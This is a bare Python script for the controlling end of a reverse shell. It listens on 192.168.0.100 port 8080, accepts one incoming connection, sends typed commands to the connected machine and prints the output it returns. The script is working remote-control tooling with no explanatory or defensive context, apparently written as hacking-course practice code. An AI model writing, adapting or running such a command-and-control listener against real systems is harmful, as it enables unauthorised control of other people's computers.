#!/usr/bin/env python
import socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.0.100", 8080))
listener.listen(0)
print("[+] Waiting for incoming connections")
client, addr  = listener.accept()
print("[+] Got new connection.")
try:
    while True:
        command = input("[Command]>>")
        client.send(command.encode('utf-8'))
        result = client.recv(1024)
        print(result.decode('utf-8'))
except Exception:
    print("[-] Don't connect it.")
    client.close()
listener.close()